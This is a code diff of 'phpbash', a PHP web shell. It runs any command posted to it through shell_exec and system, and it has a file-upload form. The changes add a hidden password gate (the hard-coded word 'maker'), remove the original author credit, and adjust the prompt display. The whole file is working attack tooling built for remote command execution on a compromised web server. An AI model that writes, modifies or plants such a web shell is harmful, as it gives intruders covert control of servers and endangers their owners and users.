@@ -1,5 +1,6 @@
 <?php
-/* phpbash by Alexander Reid (Arrexel) */
+session_start();
+if(!isset($_SESSION['loggedIn'])) $_SESSION['loggedIn'] = false; 
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
@@ -21,6 +22,11 @@ if (ISSET($_POST['cmd'])) {
 }
 $host = php_uname('n');
 $name = `whoami`;
+
+function getUserNameElement($float = true) use ($host, $name) {
+	$dir = getcwd();
+	return "<div style='color: #ff0000;" . ($float ? "float: left;" : "display: inline;"). "'>{$name}@{$host}</div>:{$dir}".'$ ';
+}
 function disable_ob() {
     // Turn off output buffering
     ini_set('output_buffering', 'off');
@@ -44,8 +50,15 @@ function disable_ob() {
         apache_setenv('dont-vary', '1');
     }
 }
-if(isset($_POST['command']))
+if(isset($_POST['command'])) {
+if(!$_SESSION['loggedIn']) {
+	if(htmlentities($_POST['command']) == 'maker')
+	$_SESSION['loggedIn'] = true;
+	else
+	$_POST['command'] = "";
+}
 				disable_ob();
+}
 ?>
 
 <html>
@@ -144,18 +157,24 @@ if(isset($_POST['command']))
         <div class="console">
             <div class="output" id="output">
 			<?php if(isset($_POST['outputData'])) echo $_POST['outputData'];?>
-			<?php if(isset($_POST['command'])) {
+			<?php if(isset($_POST['command'])&&!empty($_POST['command'])) {
 				disable_ob();
 				$command = $_POST['command'];
-				@system($command);
+				$r = @system($command);
 			} ?>
 			</div>
             <div class="input" id="input">
                 <form id="form" method="POST">
                     <div class="username" id="username">
-					<div style='color: #ff0000; display: inline;'><?php echo $name;?>@<?php echo $host;?></div>:<?php echo getcwd();?>#
+					<?php echo getUserNameElement(false);?>
 					</div>
-                   <textarea name="outputData" style="display:none" id="outD"></textarea>
+                   <textarea name="outputData" style="display:none" id="outD"><?php 
+				   if(isset($_POST['outputData'])) {
+				   $res = htmlentities($_POST['outputData']);
+				   $res .= getUserNameElement() . htmlentities($_POST['command']) . $r;
+				   echo $res;
+				   }
+				   ?></textarea>
 				   <input class="inputtext" id="inputtext" type="text" name="command" autocomplete="off" autofocus>
                 </form>
             </div>
@@ -164,11 +183,11 @@ if(isset($_POST['command']))
             <input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
         </form>
         <script type="text/javascript">
-            var username = "<?php echo $name;?>";
-            var hostname = "<?php echo $host;?>";
-            var currentDir = "<?php echo getcwd();?>";
+            var username = `<?php echo $name;?>`;
+            var hostname = `<?php echo $host;?>`;
+            var currentDir = `<?php echo getcwd();?>`;
             var previousDir = "";
-            var defaultDir = "<?php echo $_SERVER['DOCUMENT_ROOT']; ?>";
+            var defaultDir = `<?php echo $_SERVER['DOCUMENT_ROOT']; ?>`;
             var commandHistory = [];
             var currentCommand = 0;
             var inputTextElement = get('#inputtext');
@@ -195,7 +214,8 @@ if(isset($_POST['command']))
                 if (parsedCommand[0] == "cd") {
                     cd = true;
                     if (parsedCommand.length == 1) {
-                        command = "cd "+defaultDir+"; pwd";
+                        outputElement.innerHTML += getUserEl() + currentDir + "<br>";
+						return;
                     } else if (parsedCommand[1] == "-") {
                         command = "cd "+previousDir+"; pwd";
                     } else {
@@ -222,16 +242,16 @@ if(isset($_POST['command']))
                             var parsedResponse = request.responseText.split("<br>");
                             previousDir = currentDir;
                             currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
-                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'><?php echo $name;?>@<?php echo $host;?></div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
-                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'><?php echo $name;?>@<?php echo $host;?></div>:"+currentDir+"#";
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'><?php echo $name;?>@<?php echo $host;?></div><div style='float: left;'>"+":"+originalDir+"$ "+originalCommand+"</div><br>";
+                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'><?php echo $name;?>@<?php echo $host;?></div>:"+currentDir+"$ ";
 
                         updateInputWidth();
                 });
-				txtArea.value = outputElement.innerHTML;
+				txtArea.value += outputElement.innerHTML;
             }
             
             function updateInputWidth() {
-                inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
+                inputTextElement.style.width = window.innerWidth - usernameElement.clientWidth - 15;
             }
             
             document.onkeydown = checkForArrowKeys;
